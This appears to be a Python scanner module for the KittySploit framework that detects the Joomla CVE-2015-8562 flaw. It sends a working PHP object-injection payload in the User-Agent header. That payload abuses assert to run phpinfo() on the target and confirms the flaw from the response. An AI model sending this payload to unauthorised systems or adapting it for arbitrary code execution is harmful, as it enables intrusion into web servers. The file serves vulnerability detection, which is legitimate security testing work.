#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Joomla! 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla HTTP Header Unauthenticated - Remote Code Execution Detection',
        'description': 'Joomla! 1.5.x, 2.x, and 3.x before 3.4.6 allow remote attackers to conduct PHP object injection attacks and execute arbitrary PHP code via the HTTP User-Agent header, as exploited in the wild in December 2015',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2015', 'joomla', 'rce', 'unauth', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2015-8562',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-8562',
        ],
        'cve': 'CVE-2015-8562',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Joomla',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'User-Agent': '123}__test|O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:10:"javascript";i:9999;s:8:"feed_url";s:37:"phpinfo();JFactory::getConfig();exit;";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}𝌆', 'Connection': 'close'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('PHP Extension', 'PHP Version',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Joomla HTTP Header Unauthenticated - Remote Code Execution detected', path=path)
            return True
        return False

